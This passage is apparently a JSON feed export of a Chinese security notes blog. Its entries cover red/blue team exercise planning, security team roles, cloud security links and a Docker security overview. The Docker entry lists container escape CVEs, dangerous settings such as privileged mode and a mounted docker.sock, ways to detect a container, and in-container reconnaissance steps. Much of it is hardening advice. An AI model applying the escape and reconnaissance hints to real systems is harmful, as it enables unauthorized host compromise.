侧重</h1>\n<p>企业网络蓝军工作内容主要包括渗透测试和红蓝对抗，这两种方式所使用的技术基本相同，但是侧重点不同。</p>\n<p>渗透测试侧重用较短的时间去挖掘更多的安全漏洞，一般不太关注攻击行为是否被监测发现，目的是帮助业务系统暴露和收敛更多风险。</p>\n<p>红蓝对抗更接近真实场景，偏向于实战，面对的场景复杂、技术繁多。侧重绕过防御体系，毫无声息达成获取业务权限或数据的目标。不求发现全部风险点，因为攻击动作越多被发现的概率越大，一旦被发现，红军就会把蓝军踢出战场。红蓝对抗的目的是检验在真实攻击中纵深防御能力、告警运营质量、应急处置能力。</p>\n<h1 id=\"目标\"><a class=\"anchor\" href=\"#目标\">#</a> 目标</h1>\n<ul>\n<li>评估现有防御能力的有效性、识别防御体系的弱点并提出具体的应对方案</li>\n<li>利用真实有效的模拟攻击来评估因为安全问题所造成的潜在的业务影响，为安全管理提供有效的数据来量化安全投入的 ROI</li>\n<li>提高公司安全成熟度及其检测和响应攻击的能力</li>\n</ul>\n<h1 id=\"前期准备\"><a class=\"anchor\" href=\"#前期准备\">#</a> 前期准备</h1>\n<ul>\n<li>\n<p>组织结构图</p>\n</li>\n<li>\n<p>全网拓扑图</p>\n</li>\n<li>\n<p>各系统逻辑结构图</p>\n</li>\n<li>\n<p>各系统之间的调用关系</p>\n</li>\n<li>\n<p>数据流关系</p>\n</li>\n<li>\n<p>资产梳理</p>\n<ul>\n<li>核心资产清单</li>\n<li>业务系统资产</li>\n<li>设备资产</li>\n<li>外包 / 第三方服务资产</li>\n<li>历史遗留资产</li>\n</ul>\n</li>\n<li>\n<p>业务资产信息</p>\n<ul>\n<li>业务系统名称</li>\n<li>业务系统类型</li>\n<li>服务器类型</li>\n<li>域名 / IP 地址</li>\n<li>服务端口</li>\n<li>版本</li>\n<li>系统部署位置</li>\n<li>开发框架</li>\n<li>中间件</li>\n<li>数据库</li>\n<li>责任人</li>\n<li>维护人员</li>\n</ul>\n</li>\n<li>\n<p>设备资产信息</p>\n<ul>\n<li>设备名称</li>\n<li>设备版本号</li>\n<li>固件版本号</li>\n<li>IP 地址</li>\n<li>部署位置</li>\n<li>责任人</li>\n<li>维护人员</li>\n</ul>\n</li>\n<li>\n<p>外包 / 第三方服务资产信息</p>\n<ul>\n<li>厂商联系方式</li>\n<li>系统名称</li>\n<li>系统类型</li>\n<li>IP/URL 地址</li>\n<li>部署位置</li>\n<li>责任人</li>\n<li>维护人员</li>\n<li>厂商联系方式</li>\n<li>第三方值班人员</li>\n</ul>\n</li>\n<li>\n<p>风险梳理</p>\n<ul>\n<li>基础设施风险</li>\n<li>帐号权限梳理</li>\n<li>互联网风险排查</li>\n<li>收敛攻击面</li>\n</ul>\n</li>\n<li>\n<p>应急响应计划</p>\n</li>\n<li>\n<p>业务连续性计划</p>\n</li>\n<li>\n<p>灾难恢复计划</p>\n</li>\n</ul>\n<h1 id=\"行动流程\"><a class=\"anchor\" href=\"#行动流程\">#</a> 行动流程</h1>\n<ul>\n<li>\n<p>攻击准备</p>\n<ul>\n<li>明确授权范围、测试目标、限制条件等</li>\n<li>报备与授权流程</li>\n<li>行动成本与预算</li>\n</ul>\n</li>\n<li>\n<p>攻击执行</p>\n<ul>\n<li>备案的时间区间内</li>\n<li>备案的目标范围内</li>\n<li>备案的攻击 IP 与网络环境</li>\n</ul>\n</li>\n<li>\n<p>攻击完成</p>\n<ul>\n<li>恢复所有修改</li>\n<li>移除所有持久化控制</li>\n<li>提交攻击报告与改进建议</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"注意事项\"><a class=\"anchor\" href=\"#注意事项\">#</a> 注意事项</h1>\n<ul>\n<li>测试前进行报备</li>\n<li>有可能会影响到业务的操作时候提前沟通</li>\n<li>漏洞和业务沟通确认后再发工单修复</li>\n<li>漏洞闭环</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvOGlKczJPTjY2TlkxSmRidDdjLUJUQQ==\">以攻促防 企业蓝军建设思考</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2F2ZmlzaGVyLndpbi9hcmNoaXZlcy8xMTc1\">云上攻防：Red Teaming for Cloud</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmVvcG9pbnRzLzI1MjIyOS5odG1s\">网络攻防演练之企业蓝队建设指南</span></li>\n</ul>\n",
            "tags": [
                "网络攻防"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%9B%A2%E9%98%9F%E5%BB%BA%E8%AE%BE/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%9B%A2%E9%98%9F%E5%BB%BA%E8%AE%BE/",
            "title": "团队建设",
            "date_published": "2022-11-29T09:10:49.000Z",
            "content_html": "<h1 id=\"人员分工\"><a class=\"anchor\" href=\"#人员分工\">#</a> 人员分工</h1>\n<ul>\n<li>部门负责人\n<ul>\n<li>负责组织整体的信息安全规划</li>\n<li>负责向高层沟通申请资源</li>\n<li>负责与组织其他部门的协调沟通</li>\n<li>共同推进信息安全工作</li>\n<li>负责信息安全团队建设</li>\n<li>负责安全事件应急工作处置</li>\n<li>负责推动组织安全规划的落实</li>\n</ul>\n</li>\n<li>合规管理员\n<ul>\n<li>负责安全相关管理制度、管理流程的制定，监督实施情况，修改和改进相关的制度和流程</li>\n<li>负责合规性迎检准备工作，包括联络、迎检工作推动，迎检结果汇报等所有相关工作</li>\n<li>负责与外部安全相关单位联络</li>\n<li>负责安全意识培训、宣传和推广</li>\n</ul>\n</li>\n<li>安全技术负责人\n<ul>\n<li>业务安全防护整体技术规划和计划</li>\n<li>了解组织安全技术缺陷，并能找到方法进行防御</li>\n<li>安全设备运维</li>\n<li>服务器与网络基础设备的安全加固推进工作</li>\n<li>安全事件排查与分析，配合定期编写安全分析报告</li>\n<li>关注注业内安全事件， 跟踪最新漏洞信息，进行业务产品的安全检查</li>\n<li>负责漏洞修复工作推进，跟踪解决情况，问题收集</li>\n<li>了解最新安全技术趋势</li>\n</ul>\n</li>\n<li>渗透 / 代码审计人员\n<ul>\n<li>对组织业务网站、业务系统进行安全评估测试</li>\n<li>对漏洞结果提供解决方案和修复建议</li>\n</ul>\n</li>\n<li>安全设备运维人员\n<ul>\n<li>负责设备配置和策略的修改</li>\n<li>负责协助其他部门的变更导致的安全策略修改的实现</li>\n</ul>\n</li>\n<li>安全开发\n<ul>\n<li>根据组织安全的需要开发安全辅助工具或平台</li>\n<li>参与安全系统的需求分析、设计、编码等开发工作</li>\n<li>维护公司现有的安全程序与系统</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnFPRlAyMTdraU41NUlXYl9vUVAtdw==\">初入甲方的企业安全建设规划</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUmxCVEg5LXhyWTdOZDFaSkszS2pEUQ==\">企业安全项目架构实践分享</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTk2NQ==\">企业信息安全团队建设</span></li>\n</ul>\n",
            "tags": [
                "分工",
                "职能"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/",
            "url": "https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/",
            "title": "参考链接",
            "date_published": "2022-11-29T08:46:20.000Z",
            "content_html": "<h1 id=\"文档\"><a class=\"anchor\" href=\"#文档\">#</a> 文档</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvaG9tZS8=\">Kubernetes Documentation</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLm9wZW5zdGFjay5vcmcvd2lraS9NYWluX1BhZ2U=\">Openstack wiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubnNhLmdvdi9OZXdzLUZlYXR1cmVzL0ZlYXR1cmUtU3Rvcmllcy9BcnRpY2xlLVZpZXcvQXJ0aWNsZS8yNzE2OTgwL25zYS1jaXNhLXJlbGVhc2Uta3ViZXJuZXRlcy1oYXJkZW5pbmctZ3VpZGFuY2Uv\">NSA, CISA release Kubernetes Hardening Guidance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Jvb3Rzb25namMva3ViZXJuZXRlcy1oYXJkZW5pbmctZ3VpZGFuY2U=\">Kubernetes Hardening Guidance</span> Kubernetes 加固手册</li>\n</ul>\n<h1 id=\"元数据安全\"><a class=\"anchor\" href=\"#元数据安全\">#</a> 元数据安全</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3Rzb3NlY3VyZS5jb20vZXhwbG9pdGluZy1zc3JmLWluLWF3cy1lbGFzdGljLWJlYW5zdGFsay8=\">Exploiting SSRF in AWS Elastic Beanstalk</span></li>\n</ul>\n<h1 id=\"云存储\"><a class=\"anchor\" href=\"#云存储\">#</a> 云存储</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NlcGgvY2VwaA==\">ceph</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90cmFja2VyLmNlcGguY29tLw==\">ceph tracker</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Cloud%20Security/Docker/",
            "url": "https://mobius-0.github.io/security/WebNote/Cloud%20Security/Docker/",
            "title": "Docker",
            "date_published": "2022-11-29T08:23:20.000Z",
            "content_html": "<h1 id=\"虚拟化技术与容器技术\"><a class=\"anchor\" href=\"#虚拟化技术与容器技术\">#</a> 虚拟化技术与容器技术</h1>\n<h2 id=\"传统虚拟化技术\"><a class=\"anchor\" href=\"#传统虚拟化技术\">#</a> 传统虚拟化技术</h2>\n<p>传统虚拟化技术通过添加 hypervisor 层，虚拟出网卡，内存，CPU 等虚拟硬件，再在其上建立客户机，每个客户机都有自己的系统内核。传统虚拟化技术以虚拟机为管理单元，各虚拟机拥有独立的操作系统内核，不共用宿主机的软件系统资源，因此具有良好的隔离性，适用于云计算环境中的多租户场景。</p>\n<h2 id=\"容器技术\"><a class=\"anchor\" href=\"#容器技术\">#</a> 容器技术</h2>\n<p>容器技术可以看作一种轻量级的虚拟化方式，容器技术在操作系统层进行虚拟化，可在宿主机内核上运行多个虚拟化环境。相比于传统的应用测试与部署，容器的部署无需预先考虑应用的运行环境兼容性问题；相比于传统虚拟机，容器无需独立的操作系统内核就可在宿主机中运行，实现了更高的运行效率与资源利用率。</p>\n<h1 id=\"docker\"><a class=\"anchor\" href=\"#docker\">#</a> Docker</h1>\n<p>Docker 是目前最具代表性的容器平台之一，具有持续部署与测试、跨云平台支持等优点。在基于 Kubernetes 等容器编排工具实现的容器云环境中，通过对跨主机集群资源的调度，容器云可提供资源共享与隔离、容器编排与部署、应用支撑等功能。</p>\n<h2 id=\"基本概念\"><a class=\"anchor\" href=\"#基本概念\">#</a> 基本概念</h2>\n<p>Docker 有三个基本概念，镜像（Image）、容器（Container）、仓库（Repository）。镜像是一个只读的模版，由一组文件系统通过 Union FS 技术组成。</p>\n<p>镜像是静态的定义，容器是从镜像创建的运行实例。容器的本质是进程，拥有自己独立的命名空间。</p>\n<p>仓库（Repository） 是集中存放镜像文件的场所，用于存储、分发镜像。</p>\n<p>容器可以被启动、开始、停止、删除，每个容器都是相互隔离的，可以把容器看做是一个简易版的 Linux 环境（包括 root 用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p>\n<h2 id=\"组成\"><a class=\"anchor\" href=\"#组成\">#</a> 组成</h2>\n<p>Docker 引擎由如下主要组件构成：Docker 客户端（Docker Client）、Docker 守护进程（Docker daemon）、containerd 以及 RunC，它们共同负责容器的创建和运行。</p>\n<p>Docker Client 是和 Docker Daemon 建立通信客户端，Docker Client 可以通过 http/unix socket 等方式 Daemon 建立通信。</p>\n<p>Docker Daemon 是容器管理的守护进程，在宿主机运行，作为服务端接受来自客户端的请求，主要功能包括镜像管理、镜像构建、REST API、身份验证、安全、核心网络以及编排。Docker daemon 通过位于  <code>/var/run/docker.sock</code>  的本地 IPC/Unix socket 来实现 Docker 远程 API，默认非 TLS 网络端口为 2375，TLS 默认端口为 2376。</p>\n<p>containerd 是容器技术标准化之后出现的，用于将容器运行时从 Docker Daemon 剥离。containerd 主要职责是镜像管理、容器执行。</p>\n<p>RunC 是 Docker 按照 OCF 标准制定的一种具体实现，实现了容器启动与停止、资源隔离等功能。</p>\n<h2 id=\"数据\"><a class=\"anchor\" href=\"#数据\">#</a> 数据</h2>\n<p>Docker 的数据主要分为持久化和非持久化数据，默认情况下非持久化存储是自动创建生命周期与容器相同，删除容器也会删除非持久化数据，在 Linux 环境下，非持久化数据默认存储于  <code>/var/lib/docker/</code>  下。</p>\n<h2 id=\"网络\"><a class=\"anchor\" href=\"#网络\">#</a> 网络</h2>\n<p>Docker 网络架构源自一种叫作容器网络模型的方案，主要由 CNM、Libnetwork、网络驱动构程。</p>\n<h1 id=\"安全风险与安全机制\"><a class=\"anchor\" href=\"#安全风险与安全机制\">#</a> 安全风险与安全机制</h1>\n<p>在考虑 Docker 安全性的时候主要考虑以下几点</p>\n<ul>\n<li>内核本身的安全性及其对命名空间和 cgroups 的支持</li>\n<li>Docker 守护进程本身的攻击面</li>\n<li>内核的 “强化” 安全功能以及它们如何与容器进行交互</li>\n</ul>\n<h2 id=\"docker安全基线\"><a class=\"anchor\" href=\"#docker安全基线\">#</a> Docker 安全基线</h2>\n<p><img data-src=\"https://s2.loli.net/2022/11/29/Xd5eqSFysvYKQm1.png\" alt=\"\" /></p>\n<h2 id=\"内核命名空间namespace\"><a class=\"anchor\" href=\"#内核命名空间namespace\">#</a> 内核命名空间 /namespace</h2>\n<p>Docker 容器与 LXC 容器非常相似，并且具有相似的安全特性。当使用 docker 运行启动容器时，Docker 会在后台为容器创建一组命名空间和控制组。</p>\n<p>命名空间提供了一个最直接的隔离形式：在容器中运行的进程看不到或者无法影响在另一个容器或主机系统中运行的进程。</p>\n<p>每个容器也有自己的网络堆栈，这意味着一个容器不能获得对另一个容器的套接字或接口的特权访问。当然，如果主机系统相应设置，容器可以通过各自的网络接口交互。如果为容器指定公共端口或使用链接时，容器之间允许 IP 通信。</p>\n<p>它们可以相互 ping 通，发送 / 接收 UDP 数据包，并建立 TCP 连接，但是如果需要可以限制它们。从网络体系结构的角度来看，给定 Docker 主机上的所有容器都位于网桥接口上。这意味着它们就像通过普通的以太网交换机连接的物理机器一样。</p>\n<h2 id=\"control-group\"><a class=\"anchor\" href=\"#control-group\">#</a> Control Group</h2>\n<p>控制组是 Linux 容器的另一个关键组件，主要作用是实施资源核算和限制。</p>\n<p>Cgroup 提供了许多有用的度量标准，但也有助于确保每个容器都能获得公平的内存，CPU 和磁盘 I/O; 更重要的是单个容器不能通过耗尽资源的方式来降低系统的性能。</p>\n<p>因此，尽管 Cgroup 不能阻止一个容器访问或影响另一个容器的数据和进程，但它们对于抵御一些拒绝服务攻击是至关重要的。它们对于多租户平台尤其重要，例如公共和私人 PaaS，即使在某些应用程序开始行为不当时也能保证一致的正常运行时间（和性能）。</p>\n<h2 id=\"守护进程的攻击面\"><a class=\"anchor\" href=\"#守护进程的攻击面\">#</a> 守护进程的攻击面</h2>\n<p>使用 Docker 运行容器意味着运行 Docker 守护进程，而这个守护进程当前需要 root 权限，因此，守护进程是需要考虑的一个地方。</p>\n<p>首先，只有受信任的用户才能被允许控制 Docker 守护进程。具体来说，Docker 允许您在 Docker 主机和访客容器之间共享一个目录；它允许你这样做而不限制容器的访问权限。这意味着可以启动一个容器，其中 /host 目录将成为主机上的 / 目录，容器将能够不受任何限制地改变主机文件系统。</p>\n<p>这具有很强的安全意义：例如，如果通过 Web 服务器测试 Docker 以通过 API 配置容器，则应该更加仔细地进行参数检查，以确保恶意用户无法传递制作的参数，从而导致 Docker 创建任意容器。</p>\n<p>守护进程也可能容易受到其他输入的影响，例如从具有 docker 负载的磁盘或从具有 docker pull 的网络加载映像。</p>\n<p>最终，预计 Docker 守护进程将运行受限特权，将操作委托给审核良好的子进程，每个子进程都有自己的（非常有限的）Linux 功能范围，虚拟网络设置，文件系统管理等。也就是说，很可能，Docker 引擎本身的部分将在容器中运行。</p>\n<h2 id=\"capability\"><a class=\"anchor\" href=\"#capability\">#</a> Capability</h2>\n<p>默认情况下，Docker 采用 Capability 机制来实现用户在以 root 身份运行容器的同时，限制部分 root 的操作。</p>\n<p>在大多数情况下，容器不需要真正的 root 权限。因此，Docker 可以运行一个 Capability 较低的集合，这意味着容器中的 root 比真正的 root 要少得多。例如：</p>\n<ul>\n<li>否认所有挂载操作</li>\n<li>拒绝访问原始套接字（防止数据包欺骗）</li>\n<li>拒绝访问某些文件系统操作，如创建新的设备节点，更改文件的所有者或修改属性（包括不可变标志）</li>\n<li>拒绝模块加载</li>\n<li>其他</li>\n</ul>\n<p>这意味着，即使入侵者在容器内获取 root 权限，进一步攻击也会困难很多。默认情况下，Docker 使用白名单而不是黑名单，去除了所有非必要的功能。</p>\n<h2 id=\"seccomp\"><a class=\"anchor\" href=\"#seccomp\">#</a> Seccomp</h2>\n<p>Docker 使用 Seccomp 来限制容器对宿主机内核发起的系统调用。</p>\n<h1 id=\"攻击面分析\"><a class=\"anchor\" href=\"#攻击面分析\">#</a> 攻击面分析</h1>\n<h2 id=\"供应链安全\"><a class=\"anchor\" href=\"#供应链安全\">#</a> 供应链安全</h2>\n<p>在构建 Dockerfile 的过程中，即使是使用排名靠前的来源，也可能存在 CVE 漏洞、后门、镜像被污染、镜像中的依赖库存在漏洞等问题。</p>\n<h2 id=\"虚拟化风险\"><a class=\"anchor\" href=\"#虚拟化风险\">#</a> 虚拟化风险</h2>\n<p>虽然 Docker 通过命名空间进行了文件系统资源的基本隔离，但仍有  <code>/sys</code>  、 <code>/proc/sys</code>  、  <code>/proc/bus</code>  、  <code>/dev</code>  、 <code>time</code>  、 <code>syslog</code>  等重要系统文件目录和命名空间信息未实现隔离，而是与宿主机共享相关资源。</p>\n<h2 id=\"利用内核漏洞逃逸\"><a class=\"anchor\" href=\"#利用内核漏洞逃逸\">#</a> 利用内核漏洞逃逸</h2>\n<ul>\n<li>CVE-2022-0847 Dirty Pipe</li>\n<li>CVE-2021-4034 Polkit</li>\n<li>CVE-2018-18955</li>\n<li>CVE-2016-5195</li>\n</ul>\n<h2 id=\"容器逃逸漏洞\"><a class=\"anchor\" href=\"#容器逃逸漏洞\">#</a> 容器逃逸漏洞</h2>\n<ul>\n<li>CVE-2021-41091</li>\n<li>CVE-2020-15257 Containerd 逃逸\n<ul>\n<li>需要网络设置为 host 模式</li>\n</ul>\n</li>\n<li>CVE-2019-14271 Docker cp</li>\n<li>CVE-2019-13139 Docker build code execution</li>\n<li>CVE-2019-5736 runC\n<ul>\n<li>Docker Version &lt; 18.09.2</li>\n<li>Version &lt;= 1.0-rc6</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"配置不当\"><a class=\"anchor\" href=\"#配置不当\">#</a> 配置不当</h2>\n<ul>\n<li>开启 privileged</li>\n<li>挂载宿主机敏感目录</li>\n<li>配置 cap 不当\n<ul>\n<li><code>--cap-add=SYS_ADMIN</code></li>\n</ul>\n</li>\n<li>绕过 namespace\n<ul>\n<li><code>--net=host</code></li>\n<li><code>--pid=host</code></li>\n<li><code>--ipc=host</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"拒绝服务\"><a class=\"anchor\" href=\"#拒绝服务\">#</a> 拒绝服务</h2>\n<ul>\n<li>CPU 耗尽</li>\n<li>内存耗尽</li>\n<li>存储耗尽</li>\n<li>网络资源耗尽</li>\n</ul>\n<h2 id=\"危险挂载\"><a class=\"anchor\" href=\"#危险挂载\">#</a> 危险挂载</h2>\n<ul>\n<li>挂载  <code>/var/run/docker.sock</code></li>\n<li>挂载宿主机  <code>/dev</code>   <code>/proc</code>  等危险目录</li>\n</ul>\n<h2 id=\"攻击-docker-守护进程\"><a class=\"anchor\" href=\"#攻击-docker-守护进程\">#</a> 攻击 Docker 守护进程</h2>\n<p>虽然 Docker 容器具有很强的安全保护措施，但是 Docker 守护进程本身并没有被完善的保护。Docker 守护进程本身默认由 root 用户运行，并且该进程本身并没有使用 Seccomp 或者 AppArmor 等安全模块进行保护。这使得一旦攻击者成功找到漏洞控制 Docker 守护进程进行任意文件写或者代码执行，就可以顺利获得宿主机的 root 权限而不会受到各种安全机制的阻碍。值得一提的是，默认情况下 Docker 不会开启 User Namespace 隔离，这也意味着 Docker 内部的 root 与宿主机 root 对文件的读写权限相同。这导致一旦容器内部 root 进程获取读写宿主机文件的机会，文件权限将不会成为另一个问题。这一点在 CVE-2019-5636 利用中有所体现。</p>\n<h2 id=\"其他cve\"><a class=\"anchor\" href=\"#其他cve\">#</a> 其他 CVE</h2>\n<ul>\n<li>CVE-2014-5277</li>\n<li>CVE-2014-6408</li>\n<li>CVE-2014-9357</li>\n<li>CVE-2014-9358</li>\n<li>CVE-2015-3627</li>\n<li>CVE-2015-3630</li>\n</ul>\n<h1 id=\"安全加固\"><a class=\"anchor\" href=\"#安全加固\">#</a> 安全加固</h1>\n<ul>\n<li>最小安装\n<ul>\n<li>删除所有开发工具（编译器等）</li>\n</ul>\n</li>\n<li>更新系统源</li>\n<li>启用 AppArmor</li>\n<li>启用 SELinux</li>\n<li>限制运行容器的内核功能</li>\n<li>移除依赖构建</li>\n<li>配置严格的网络访问控制策略</li>\n<li>不使用 root 用户启动 docker</li>\n<li>不以 privileged 特权模式运行容器</li>\n<li>控制资源\n<ul>\n<li>CPU Share</li>\n<li>CPU 核数</li>\n<li>内存资源</li>\n<li>IO 资源</li>\n<li>磁盘资源</li>\n<li>硬件资源</li>\n<li>单位时间内进程数量上限</li>\n</ul>\n</li>\n<li>使用安全的基础镜像</li>\n<li>定期安全扫描和更新补丁</li>\n<li>删除镜像中的 setuid 和 setgid 权限\n<ul>\n<li><code>RUN find / -perm +6000-type f-exec chmod a-s &#123;&#125; \\;|| true</code></li>\n</ul>\n</li>\n<li>配置 Docker 守护程序的 TLS 身份验证</li>\n<li>如非必要 禁止容器间通信</li>\n<li>rootless Docker\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nZXQuZG9ja2VyLmNvbS9yb290bGVzcw==\">https://get.docker.com/rootless</span></li>\n</ul>\n</li>\n<li>使用 Seccomp 限制 syscall</li>\n<li>构建环境和在线环境分开</li>\n<li>证书校验</li>\n</ul>\n<h1 id=\"docker-环境识别\"><a class=\"anchor\" href=\"#docker-环境识别\">#</a> Docker 环境识别</h1>\n<h2 id=\"docker内\"><a class=\"anchor\" href=\"#docker内\">#</a> Docker 内</h2>\n<ul>\n<li>MAC 地址为  <code>02:42:ac:11:00:00</code>  -  <code>02:42:ac:11:ff:ff</code></li>\n<li><code>ps aux</code>  大部分运行的程序 pid 都很小</li>\n<li><code>cat /proc/1/cgroup</code>  docker 的进程</li>\n<li>docker 环境下存在  <code>.dockerenv</code></li>\n<li>部分容器中缺少许多常用的命令如  <code>ping</code>  等</li>\n</ul>\n<h2 id=\"docker外\"><a class=\"anchor\" href=\"#docker外\">#</a> Docker 外</h2>\n<ul>\n<li><code>/var/run/docker.sock</code>  文件存在</li>\n<li><code>2375</code>  /  <code>2376</code>  端口开启</li>\n</ul>\n<h1 id=\"容器内信息收集\"><a class=\"anchor\" href=\"#容器内信息收集\">#</a> 容器内信息收集</h1>\n<ul>\n<li>用户信息 (当前用户、用户列表)</li>\n<li>操作系统与内核版本</li>\n<li>运行进程信息 (进程名、权限等)</li>\n<li>容器是否为特权容器</li>\n<li>环境变量</li>\n<li>判断容器挂载信息，尝试挂载 Docker Socket</li>\n<li>网络环境，判断可以到达的网段</li>\n<li>在云环境中，尝试获取元数据信息</li>\n</ul>\n<h1 id=\"镜像\"><a class=\"anchor\" href=\"#镜像\">#</a> 镜像</h1>\n<h2 id=\"基本概念-2\"><a class=\"anchor\" href=\"#基本概念-2\">#</a> 基本概念</h2>\n<p>Docker 镜像可以看作是一个特殊的文件系统，用于提供容器运行时所需的文件，同时镜像还包含了一些为运行时准备的一些信息（环境变量、用户等）。</p>\n<p>在构建之后镜像不会被改变，即是说镜像中不会包含动态的数据。</p>\n<h2 id=\"windows-镜像\"><a class=\"anchor\" href=\"#windows-镜像\">#</a> Windows 镜像</h2>\n<p>由于 Windows 并不直接开放 syscall ，所有的 Windows 程序都必须通过 sys dll 与内核沟通，这就导致 Windows 镜像并不能直接通过 scratch 来构建，只能基于微软提供的几个基础镜像来构建。</p>\n<p>镜像包括：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dzLXNlcnZlcmNvcmU=\">windows servercore</span> 功能最完整，包含传统的 .net framework 环境</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dzLW5hbm9zZXJ2ZXI=\">windows nanoserver</span> 包含 .net core 运行环境</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dz\">windows</span> 提供完整的 windows server api，正在被 windows server 替代</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dzLXNlcnZlci8=\">windows server</span> 提供完整的 windows server api</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"安全分析\"><a class=\"anchor\" href=\"#安全分析\">#</a> 安全分析</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmhlcm9rdS5jb20vZXhwbG9yYXRpb24tb2Ytc2VjdXJpdHktd2hlbi1idWlsZGluZy1kb2NrZXItY29udGFpbmVycw==\">A House of Cards An Exploration of Security When Building Docker Containers</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL29icm93bi5pby8yMDE2LzAyLzE1L3ByaXZpbGVnZWQtY29udGFpbmVycy5odG1s\">Privileged Docker Containers</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9raXRjdGYuZGUvd3JpdGV1cHMvMzJjM2N0Zi9kb2NrZXI=\">32c3 docker writeup</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnFpbml1LmNvbS9hcmNoaXZlcy83NzQz\">打造安全的容器云平台</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5L3NlY3VyaXR5Lw==\">Docker security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvZG9ja2VyLW1pcnJvci1zZWN1cml0eS8=\">容器安全</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdHJtLnNoL3Bvc3QvYWJ1c2luZy1pbnNlY3VyZS1kb2NrZXItZGVwbG95bWVudHMv\">CVE-2017-7494 Docker 沙箱逃逸</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIyMTMxOS5odG1s\">Docker 容器安全性分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5L2FwcGFybW9yLw==\">AppArmor security profiles for Docker</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RvY2tlci9kb2NrZXItYmVuY2gtc2VjdXJpdHk=\">Docker Bench for Security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZDlEM3oxM3VDT0pvSnpwbHB1M1dKUQ==\">Docker 安全性与攻击面分析</span></li>\n<li>Pfleeger C P , Pfleeger S L , Theofanos M F . A methodology for penetration testing[J]. Computers &amp; Security, 1989, 8(7):613-620.</li>\n</ul>\n<h2 id=\"windows\"><a class=\"anchor\" href=\"#windows\">#</a> Windows</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3ZpcnR1YWxpemF0aW9uL3dpbmRvd3Njb250YWluZXJzL21hbmFnZS1jb250YWluZXJzL2NvbnRhaW5lci1iYXNlLWltYWdlcw==\">Container Base Images</span></li>\n</ul>\n",
            "tags": [
                "虚拟化",
                "Docker",
                "镜像"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%AE%B9%E5%99%A8/",
            "url": "https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%AE%B9%E5%99%A8/",
            "title": "容器",
            "date_published": "2022-11-29T08:21:20.000Z",
